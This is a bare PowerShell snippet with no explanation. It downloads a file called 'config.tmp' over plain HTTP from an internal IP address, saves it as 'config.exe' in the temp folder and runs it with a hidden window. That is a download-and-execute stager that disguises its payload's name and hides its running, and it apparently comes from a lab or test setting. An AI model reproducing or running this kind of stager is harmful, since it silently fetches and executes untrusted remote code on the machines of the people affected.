$url  = "http://172.16.41.1:8000/config.tmp"
$dest = "$env:TEMP\config.exe"
Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing

Start-Process "C:\Users\test\AppData\Local\Temp\config.exe" -WindowStyle Hidden